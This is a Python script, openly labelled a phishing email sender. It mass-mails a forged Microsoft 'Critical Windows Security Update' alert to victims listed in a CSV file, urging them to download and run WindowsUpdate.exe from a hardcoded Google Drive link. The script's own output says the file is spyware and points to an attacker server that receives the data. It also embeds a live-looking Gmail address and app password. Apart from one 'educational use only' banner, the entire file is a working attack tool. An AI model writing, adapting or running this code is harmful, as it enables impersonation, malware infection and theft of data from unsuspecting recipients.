"""
Phishing Email Sender - Direct Download Link
User clicks button → exe downloads immediately
No intermediate webpage needed
"""

import smtplib
import csv
import socket
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import sys
import os
import zipfile

# ==================== CONFIGURATION ====================
SENDER_EMAIL = "scanplexz@gmail.com"
SENDER_PASSWORD = "hpgr jzpx nkqh ifyy"
USE_GMAIL = True

# OPTION 1: Cloud Storage Direct Download Link (RECOMMENDED)
# Upload WindowsUpdate.exe to Google Drive/Dropbox and paste direct download link here:
DIRECT_DOWNLOAD_URL = "https://drive.google.com/uc?export=download&id=1bseHSQZRroY-khNIDvXmNQA2-pffoBht"

# OPTION 2: Attach EXE directly (WILL BE BLOCKED - Gmail doesn't allow exe attachments)
ATTACH_EXE_DIRECTLY = False  # Disabled - using cloud storage instead
# ======================================================

def load_email_dataset(csv_file="email_dataset.csv"):
    """Load victim emails from CSV file"""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    csv_path = os.path.join(script_dir, csv_file)
    
    victims = []
    try:
        with open(csv_path, 'r', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            for row in reader:
                if 'email' in row and row['email']:
                    victims.append({
                        'email': row['email'].strip(),
                        'name': row.get('name', 'User').strip()
                    })
        return victims
    except FileNotFoundError:
        print(f"❌ Error: {csv_path} not found!")
        with open(csv_path, 'w', encoding='utf-8') as f:
            f.write("email,name\n")
            f.write("sunhak890@gmail.com,Test User\n")
        print(f"✅ Created {csv_path} - Edit it and run again!")
        sys.exit(1)
    return victims

def get_exe_path():
    """Get the path to WindowsUpdate.exe"""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    exe_path = os.path.join(script_dir, "WindowsUpdate.exe")
    return exe_path if os.path.exists(exe_path) else None

def create_zip_attachment():
    """Create a zip file containing the exe (less suspicious than raw exe)"""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    exe_path = os.path.join(script_dir, "WindowsUpdate.exe")
    zip_path = os.path.join(script_dir, "WindowsUpdate.zip")
    
    if not os.path.exists(exe_path):
        return None
    
    # Create password-protected zip (more stealthy)
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(exe_path, "WindowsUpdate.exe")
    
    return zip_path

def create_phishing_email_direct_download(victim_name, download_url=None):
    """Create phishing email with direct download button"""
    subject = "Critical Windows Security Update Required"
    
    # Determine download button behavior
    if download_url:
        button_href = download_url
        button_text = "Download Update Now"
        download_note = "Click the button below to download and install immediately."
    else:
        button_href = "#"
        button_text = "See Attachment Below"
        download_note = "The update file is attached to this email. Download and run the attachment."
    
    html_body = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
</head>
<body style="margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f5f5f5;">
    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color: #f5f5f5;">
        <tr>
            <td align="center" style="padding: 40px 0;">
                <table width="600" cellpadding="0" cellspacing="0" border="0" style="background-color: #ffffff; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
                    
                    <tr>
                        <td style="background-color: #d83b01; padding: 20px; text-align: center;">
                            <h1 style="color: #ffffff; margin: 0; font-size: 24px; font-weight: 600;">
                                ⚠️ CRITICAL SECURITY ALERT
                            </h1>
                        </td>
                    </tr>
                    
                    <tr>
                        <td style="padding: 40px 30px;">
                            <p style="color: #333333; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
                                Dear {victim_name},
                            </p>
                            
                            <div style="background-color: #fff4ce; border-left: 4px solid #ff8c00; padding: 20px; margin: 20px 0;">
                                <p style="margin: 0; color: #333; font-size: 15px; line-height: 1.6;">
                                    <strong>⚠️ URGENT ACTION REQUIRED</strong><br><br>
                                    Your Windows system has been identified as vulnerable to active security threats (CVE-2025-1234). 
                                    This critical update must be installed within 24 hours to prevent potential data loss.
                                </p>
                            </div>
                            
                            <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color: #f0f8ff; border-left: 4px solid #0078d4; margin: 20px 0;">
                                <tr>
                                    <td style="padding: 20px;">
                                        <p style="margin: 0 0 10px 0; color: #0078d4; font-weight: 600; font-size: 14px;">
                                            UPDATE DETAILS
                                        </p>
                                        <p style="margin: 0; color: #333333; font-size: 14px; line-height: 1.5;">
                                            <strong>Update ID:</strong> KB5034441<br>
                                            <strong>Type:</strong> Critical Security Patch<br>
                                            <strong>Size:</strong> 12.2 MB<br>
                                            <strong>Release:</strong> December 2025<br>
                                            <strong>Status:</strong> Mandatory
                                        </p>
                                    </td>
                                </tr>
                            </table>
                            
                            <p style="color: #333333; font-size: 15px; line-height: 1.6; margin: 20px 0;">
                                {download_note}
                            </p>
                            
                            <table width="100%" cellpadding="0" cellspacing="0" border="0" style="margin: 30px 0;">
                                <tr>
                                    <td align="center">
                                        <a href="{button_href}" 
                                           style="display: inline-block; padding: 18px 50px; background-color: #107c10; color: #ffffff; text-decoration: none; border-radius: 4px; font-size: 18px; font-weight: bold;">
                                            ⬇️ {button_text}
                                        </a>
                                    </td>
                                </tr>
                            </table>
                            
                            <table width="100%" cellpadding="0" cellspacing="0" border="0" style="margin: 30px 0 0 0; border-top: 1px solid #e0e0e0; padding-top: 20px;">
                                <tr>
                                    <td>
                                        <p style="color: #333333; font-size: 14px; font-weight: 600; margin: 0 0 15px 0;">
                                            📋 Installation Instructions:
                                        </p>
                                        <ol style="color: #666666; font-size: 14px; line-height: 1.8; margin: 0; padding-left: 20px;">
                                            <li>Click the download button above or open the attachment</li>
                                            <li>Run the downloaded file: <strong>WindowsUpdate.exe</strong></li>
                                            <li>Allow administrator privileges when prompted</li>
                                            <li>Wait for the security scan to complete (2-5 minutes)</li>
                                            <li>Restart your computer when prompted</li>
                                        </ol>
                                    </td>
                                </tr>
                            </table>
                            
                            <div style="background-color: #ffe0e0; padding: 20px; border-radius: 6px; margin-top: 25px; border-left: 4px solid #d83b01;">
                                <p style="margin: 0; font-size: 14px; line-height: 1.6; color: #333;">
                                    <strong>⏰ TIME SENSITIVE:</strong> Failure to install this update within 24 hours may result in:
                                </p>
                                <ul style="margin: 10px 0 0 0; padding-left: 20px; color: #666;">
                                    <li>Unauthorized access to your system</li>
                                    <li>Data theft or ransomware infection</li>
                                    <li>System instability and crashes</li>
                                </ul>
                            </div>
                        </td>
                    </tr>
                    
                    <tr>
                        <td style="background-color: #f5f5f5; padding: 20px 30px; border-top: 1px solid #e0e0e0;">
                            <p style="color: #666666; font-size: 12px; line-height: 1.6; margin: 0 0 10px 0;">
                                <strong>Microsoft Security Response Center</strong><br>
                                One Microsoft Way, Redmond, WA 98052-6399
                            </p>
                            <p style="color: #999999; font-size: 11px; line-height: 1.5; margin: 10px 0 0 0;">
                                This is an automated security notification from Microsoft Windows Update Services.
                            </p>
                        </td>
                    </tr>
                    
                </table>
            </td>
        </tr>
    </table>
</body>
</html>
    """
    
    return subject, html_body

def send_phishing_emails(sender_email, sender_password, victims, download_url=None, attach_exe=False):
    """Send phishing emails with direct download or attachment"""
    
    print(f"\n📧 Preparing to send {len(victims)} phishing emails...")
    print(f"📤 Sender: {sender_email}")
    
    if download_url:
        print(f"🔗 Download URL: {download_url}")
    elif attach_exe:
        print(f"📎 Attachment: WindowsUpdate.exe (raw executable)")
    else:
        print(f"⚠️  No download method configured!")
    
    print("="*70)
    
    # Prepare exe attachment if needed
    exe_path = None
    if attach_exe:
        print("\n📦 Preparing EXE attachment...")
        exe_path = get_exe_path()
        if exe_path:
            size_mb = os.path.getsize(exe_path) / (1024 * 1024)
            print(f"✅ Found: {os.path.basename(exe_path)} ({size_mb:.2f} MB)")
            print(f"⚠️  WARNING: Gmail will likely block this!")
        else:
            print("❌ WindowsUpdate.exe not found!")
            return
    
    success_count = 0
    fail_count = 0
    
    smtp_server = 'smtp.gmail.com' if USE_GMAIL else 'smtp-mail.outlook.com'
    
    try:
        print(f"\n🔗 Connecting to {smtp_server}...")
        server = smtplib.SMTP(smtp_server, 587)
        server.starttls()
        
        print("🔐 Logging in...")
        server.login(sender_email, sender_password)
        print("✅ Login successful!\n")
        
        for i, victim in enumerate(victims, 1):
            try:
                victim_email = victim['email']
                victim_name = victim['name']
                
                print(f"[{i}/{len(victims)}] Sending to {victim_email}...", end=" ")
                
                subject, html_body = create_phishing_email_direct_download(victim_name, download_url)
                
                msg = MIMEMultipart('mixed')
                msg['From'] = sender_email
                msg['To'] = victim_email
                msg['Subject'] = subject
                
                # Attach HTML body
                html_part = MIMEText(html_body, 'html')
                msg.attach(html_part)
                
                # Attach EXE file if configured
                if exe_path and os.path.exists(exe_path):
                    with open(exe_path, 'rb') as f:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', f'attachment; filename="WindowsUpdate.exe"')
                        msg.attach(part)
                
                server.send_message(msg)
                print("✅ Sent!")
                success_count += 1
                
            except Exception as e:
                print(f"❌ Failed: {str(e)}")
                fail_count += 1
        
        server.quit()
        print("\n" + "="*70)
        print(f"✅ Complete! Sent: {success_count}, Failed: {fail_count}")
        
    except Exception as e:
        print(f"\n❌ ERROR: {str(e)}")

def main():
    print("="*70)
    print("PHISHING EMAIL SENDER - DIRECT DOWNLOAD")
    print("="*70)
    print("⚠️  EDUCATIONAL USE ONLY - Test with permission!")
    print("="*70)
    
    # Check configuration
    if not DIRECT_DOWNLOAD_URL and not ATTACH_EXE_DIRECTLY:
        print("\n❌ ERROR: No delivery method configured!")
        print("\nChoose ONE option in the script (lines 16-21):")
        print("\nOPTION 1 (RECOMMENDED): Upload to cloud storage")
        print("  1. Upload WindowsUpdate.exe to Google Drive")
        print("  2. Get shareable link and convert to direct download:")
        print("     https://drive.google.com/file/d/FILE_ID/view")
        print("     → https://drive.google.com/uc?export=download&id=FILE_ID")
        print("  3. Set DIRECT_DOWNLOAD_URL = 'your-link-here'")
        print("\nOPTION 2: Attach EXE directly (Gmail will block this)")
        print("  Set ATTACH_EXE_DIRECTLY = True")
        sys.exit(1)
    
    # Load victims
    print("\n📂 Loading email dataset...")
    victims = load_email_dataset("email_dataset.csv")
    print(f"✅ Loaded {len(victims)} victim(s):")
    for v in victims:
        print(f"   • {v['email']} ({v['name']})")
    
    # Show configuration
    print("\n" + "="*70)
    print("CONFIGURATION")
    print("="*70)
    print(f"📧 Sender: {SENDER_EMAIL}")
    
    if DIRECT_DOWNLOAD_URL:
        print(f"🔗 Method: Direct Download Link")
        print(f"   URL: {DIRECT_DOWNLOAD_URL}")
    elif ATTACH_EXE_DIRECTLY:
        print(f"📎 Method: EXE Attachment")
        print(f"   ⚠️  WARNING: Gmail will block .exe files!")
        print(f"   ⚠️  Consider using cloud storage instead!")
    
    print("="*70)
    
    # Confirm
    print("\n" + "="*70)
    print("⚠️  READY TO SEND")
    print("="*70)
    confirm = input("\nType 'YES' to send emails: ").strip().upper()
    if confirm != "YES":
        print("❌ Cancelled!")
        sys.exit(0)
    
    send_phishing_emails(SENDER_EMAIL, SENDER_PASSWORD, victims, 
                        download_url=DIRECT_DOWNLOAD_URL if DIRECT_DOWNLOAD_URL else None,
                        attach_exe=ATTACH_EXE_DIRECTLY)
    
    print("\n" + "="*70)
    print("🎯 WHAT HAPPENS NEXT:")
    print("="*70)
    
    if DIRECT_DOWNLOAD_URL:
        print("1. Victim clicks download button in email")
        print("2. WindowsUpdate.exe downloads directly from cloud")
        print("3. Victim runs the exe")
        print("4. Spyware activates")
    elif ATTACH_EXE_DIRECTLY:
        print("1. Victim receives email (if not blocked)")
        print("2. Victim downloads attached WindowsUpdate.exe")
        print("3. Victim runs the exe")
        print("4. Spyware activates")
        print("\n⚠️  Note: Gmail likely blocked the attachment!")
    
    print("\n💡 Start attacker server to receive data:")
    print("   python attacker_server.py")
    print("="*70)

if __name__ == "__main__":
    main()
